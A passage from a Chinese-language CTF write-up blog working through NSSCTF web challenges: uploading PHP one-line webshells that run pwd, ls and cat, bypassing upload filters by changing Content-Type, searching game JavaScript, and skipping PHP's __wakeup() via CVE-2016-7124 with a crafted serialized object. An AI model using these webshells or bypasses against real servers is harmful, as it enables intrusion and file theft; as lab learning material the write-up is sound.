+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 执行命令：pwd</span><br><span class="line">&lt;?php @eval(system(&quot;pwd&quot;);?&gt;          # 返回：/app/upload</span><br><span class="line"># 执行命令：ls /app</span><br><span class="line">&lt;?php @eval(system(&quot;ls /app&quot;);?&gt;      # 返回：flag.php index.php upload upload.php</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;露出马脚，直接cat看一看，发现flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 执行命令：cat /app/flag.php</span><br><span class="line">&lt;?php @eval(system(&quot;cat /app/flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/423_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" class title="423_结果展示">
+
+<h2><span id="3865_litctf-2023php是世界上最好的语言">3865_[LitCTF 2023]PHP是世界上最好的语言！！</span></h2><p>&emsp;&emsp;进入环境，根据题目提示，先一句话试试水：<code>&lt;?php @eval(system(&quot;cat /flag&quot;);?&gt;</code>，直接给出结果</p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/3865_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" class title="3865_结果展示">
+
+<h2><span id="388_swpuctf-2021-新生赛easyupload10-文件上传-phpinfo直出-mime绕过">388_[SWPUCTF 2021 新生赛]easyupload1.0 –文件上传 –phpinfo()直出 –MIME绕过</span></h2><p>&emsp;&emsp;进入环境，根据题目判断为文件上传问题，先尝试构建一个一句话木马试试水</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval(system(&quot;pwd&quot;);?&gt;             #返回：想啥呢</span><br><span class="line"># 修改文件后缀为.phtml，无变化</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;这里只能看出来是代码存在一定防护机制，但看不出来针对于哪个地方；没办法，上网搜一下一般监测点</p>
+<table>
+<thead>
+<tr>
+<th align="center">监测点</th>
+<th align="center">绕过</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Content-Type</td>
+<td align="center">文件类型绕过</td>
+</tr>
+<tr>
+<td align="center">filename</td>
+<td align="center">文件头、文件后缀名绕过</td>
+</tr>
+<tr>
+<td align="center">文件内容</td>
+<td align="center">指定字符、指定格式绕过</td>
+</tr>
+</tbody></table>
+<p>&emsp;&emsp;一个个尝试下，首先是Content-Type，由于题中页面给出信息“upload1.jpg”，所以将Content-Type改为图片对应值，出现新的变动</p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/388_CT%E4%BF%AE%E6%94%B9%E7%BB%93%E6%9E%9C.png" class title="388_CT修改结果">
+
+<p>&emsp;&emsp;接下来老套路了，先理清目录结构 &#x3D;&gt; 找到马脚 &#x3D;&gt; 手拿把掐</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 运行：pwd</span><br><span class="line">&lt;?php @eval(system(&quot;pwd&quot;);?&gt;                     # 返回：/app/upload</span><br><span class="line"># 运行：ls /app</span><br><span class="line">&lt;?php @eval (system(&quot;ls /app&quot;));?&gt;               # 返回：flag.php index.php upload upload.php</span><br><span class="line"># 运行：cat ../flag.php</span><br><span class="line">&lt;?php @eval (system(&quot;cat ../flag.php&quot;));?&gt;       </span><br><span class="line"># 返回：</span><br><span class="line">&lt;?php </span><br><span class="line">$flag = &#x27;WLLMCTF&#123;I_d0nt_w4nna_wak3up&#125;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;惊吓吗，flag是错的，继续找吧；这里在找资料时发现一句新的代码：<code>&lt;?php phpinfo();?&gt;</code>，据说好用，走走看</p>
+<p>&emsp;&emsp;真好用&gt; . &lt;，下为结算画面</p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/388_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" class title="388_结果展示">
+
+<h2><span id="3863_litctf-2023导弹迷踪-不知道怎么评价">3863_[LitCTF 2023]导弹迷踪 –不知道怎么评价</span></h2><p>&emsp;&emsp;进入环境，好消息，有游戏玩；坏消息，在戏耍你</p>
+<p>&emsp;&emsp;我天生不爱游戏，选择一点点搜着看JS源代码，f、l、a、g都看了遍T _ TT _ T，没结果，还有几个.js文件，接着看</p>
+<p>&emsp;&emsp;在&#x2F;src&#x2F;game.js可以找到，给出如下</p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/3863_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" class title="3863_结果展示">
+
+<h2><span id="429_swpuctf-2021-新生赛no_wakeup-反序列化-魔术方法绕过-__wakeup绕过">429_[SWPUCTF 2021 新生赛]no_wakeup –反序列化 –魔术方法绕过 –<code>__wakeup()</code>绕过</span></h2><p>&emsp;&emsp;进入环境，点击获得PHP代码，和426一模一样，只有类名和passwd更改了，直接套用：<code>O:6:&quot;HaHaHa&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125;</code>，得到结果</p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/429_%E5%8A%A0%E5%AF%86%E7%BB%93%E6%9E%9C.png" class title="429_加密结果">
+
+<p>&emsp;&emsp;好吧其实不太一样，注意其中<code>$this-&gt;passwd = sha1($this-&gt;passwd);</code>，passwd经过了一次加密，这里先介绍反序列化的魔术方法</p>
+<table>
+<thead>
+<tr>
+<th align="center">魔术方法</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>serialize()</code></td>
+<td align="center">将对象转换成字符串</td>
+</tr>
+<tr>
+<td align="center"><code>unserialize()</code></td>
+<td align="center">将字符串还原成一个对象，触发条件：unserialize函数的变量可控，文件中存在可利用的类，类中有魔术方法</td>
+</tr>
+<tr>
+<td align="center"><code>__toString()</code></td>
+<td align="center">在将一个对象转化成字符串时自动调用，比如使用echo打印对象时</td>
+</tr>
+<tr>
+<td align="center"><code>__construct()</code></td>
+<td align="center">创建对象时触发</td>
+</tr>
+<tr>
+<td align="center"><code>__destruct()</code></td>
+<td align="center">对象被销毁时触发</td>
+</tr>
+<tr>
+<td align="center"><code>__wakeup()</code></td>
+<td align="center">unserialize()时，会检查是否存在一个__wakeup()魔术方法。存在，则该方法会先被调用</td>
+</tr>
+<tr>
+<td align="center"><code>__call()</code></td>
+<td align="center">在对象上下文中调用不可访问的方法时触发</td>
+</tr>
+<tr>
+<td align="center"><code>__invoke()</code></td>
+<td align="center">在脚本尝试将对象调用为函数时触发</td>
+</tr>
+<tr>
+<td align="center"><code>__callStatic</code></td>
+<td align="center">在静态上下文中调用不可访问的方法时触发</td>
+</tr>
+<tr>
+<td align="center"><code>__get</code></td>
+<td align="center">用于从不可访问的属性读取数据</td>
+</tr>
+<tr>
+<td align="center"><code>__set</code></td>
+<td align="center">用于将数据写入不可访问的属性</td>
+</tr>
+<tr>
+<td align="center"><code>__isset()</code></td>
+<td align="center">在不可访问的属性上调用isset()或empty()时触发</td>
+</tr>
+<tr>
+<td align="center"><code>__unset()</code></td>
+<td align="center">在不可访问的属性上使用unset()时触发</td>
+</tr>
+</tbody></table>
+<p>&emsp;&emsp;此题学习其中第六个方法的绕过，网上查阅得知：针对<code>__wakeup()</code>方法有一个CVE漏洞，CVE-2016-7124</p>
+<p>&emsp;&emsp;<span style="background-color: yellow;"><strong>CVE-2016-7124</strong></span>：当反序列化一个包含特定属性的对象时，如果对象的属性数量在序列化字符串中被错误地指定（即大于或小于对象实际具有的属性数量），那么PHP可能会跳过<code>__wakeup()</code>魔术方法的执行</p>
+<p>&emsp;&emsp;于是修改一下：<code>O:6:&quot;HaHaHa&quot;:3:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125;</code>，出现flag</p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/429_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" class title="429_结果展示">
+
+<h2><span id="441_swpuctf-2021-新生赛pseudoprotocols">441_[SWPUCTF 2021 新生赛]PseudoProtocols</span></h2>
     </div>
 
     
